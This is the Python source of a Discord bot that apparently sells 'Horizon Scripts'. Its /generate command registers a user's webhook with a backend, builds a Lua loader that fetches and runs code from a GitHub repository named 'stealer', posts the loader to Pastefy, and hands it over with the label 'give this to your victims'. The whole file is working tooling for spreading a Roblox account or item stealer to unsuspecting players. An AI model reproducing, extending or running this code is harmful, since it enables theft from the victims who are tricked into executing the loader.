import os
import discord
from discord import app_commands
from discord.ext import commands
import httpx
from dotenv import load_dotenv

load_dotenv()

bot_token = os.environ["DISCORD_BOT_TOKEN"]
protector_url = os.environ["PROTECTOR_URL"].rstrip("/")
admin_secret = os.environ["ADMIN_SECRET"]
pastefy_token = os.environ["PASTEFY_TOKEN"]
allowed_guild_id = int(os.environ.get("ALLOWED_GUILD_ID", "0"))

pastefy_api_url = "https://pastefy.app/api/v2"

intents = discord.Intents.default()
bot = commands.Bot(command_prefix="!", intents=intents)
tree = bot.tree


async def create_pastefy_paste(title: str, content: str) -> str | None:
    try:
        async with httpx.AsyncClient(timeout=15) as client:
            resp = await client.post(
                f"{pastefy_api_url}/paste",
                headers={"Authorization": f"Bearer {pastefy_token}"},
                json={"title": title, "content": content}
            )
    except httpx.RequestError as e:
        print(f"pastefy error not horizon maybe horizon idkl {e}")
        return None

    if resp.status_code not in (200, 201):
        print(f"worked {resp.status_code}: {resp.text[:200]}")
        return None

    data = resp.json()
    return data.get("url") or data.get("link") or data.get("raw")


@bot.event
async def on_ready():
    if allowed_guild_id:
        guild = discord.Object(id=allowed_guild_id)
        tree.copy_global_to(guild=guild)
        await tree.sync(guild=guild)
    else:
        await tree.sync()
    print(f"Logged in as {bot.user} | Synced commands")


@tree.command(name="generate", description="generate your scripts")
@app_commands.describe(
    username="max 30 char",
    webhook="webhook",
)
async def generate(interaction: discord.Interaction, username: str, webhook: str):
    await interaction.response.defer(ephemeral=True)

    if len(username) > 30:
        await interaction.followup.send("username too long must be under 30 char", ephemeral=True)
        return

    if "discord.com/api/webhooks/" not in webhook and "discordapp.com/api/webhooks/" not in webhook:
        await interaction.followup.send(embed=discord.Embed(title="ok it works"), ephemeral=True)
        return

    try:
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.post(
                f"{protector_url}/api/v3/token/register",
                json={"webhook_url": webhook, "username": username},
                headers={"x-admin-secret": admin_secret},
            )
    except httpx.RequestError as e:
        await interaction.followup.send(f"failed to reach webhook prot ask temphor he should know! `{e}`", ephemeral=True)
        return

    if resp.status_code != 200:
        await interaction.followup.send(
            f"Protector API error `{resp.status_code}`: {resp.text[:200]}", ephemeral=True
        )
        return

    data = resp.json()
    token = data.get("token", "unknown")

    lua_script = f'''user = "{username}"
id = "{token}"
loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/loader", true))()'''

    paste_url = await create_pastefy_paste(f"Horizon_{username}", lua_script)

    if not paste_url:
        await interaction.followup.send("failed to create pastefy :sob:", ephemeral=True)
        return

    loadstring_line = f'loadstring(game:HttpGet("{paste_url}", true))()'

    embed = discord.Embed(
        title="generated",
        description="btw uh hi",
        color=0x57F287,
    )
    embed.add_field(name="Username", value=f"`{username}`", inline=True)
    embed.add_field(name="Token", value=f"`{token}`", inline=True)
    embed.add_field(
        name="give this to your victims or smthn",
        value=f"```lua\n{lua_script}\n```",
        inline=False
    )
    embed.set_footer(text="Horizon Scripts | Best Script Services")

    await interaction.followup.send(embed=embed, ephemeral=True)

    try:
        dm_embed = discord.Embed(
            title="temphor on top!",
            description="stealer:",
            color=0x57F287,
        )
        dm_embed.add_field(
            name="Loadstring",
            value=f"```lua\n{loadstring_line}\n```",
            inline=False
        )
        dm_embed.set_footer(text="Horizon Scripts | Best Script Services")
        await interaction.user.send(embed=dm_embed)
    except discord.Forbidden:
        await interaction.followup.send("can't dm you check yo privace or ask temphor", ephemeral=True)


bot.run(bot_token)
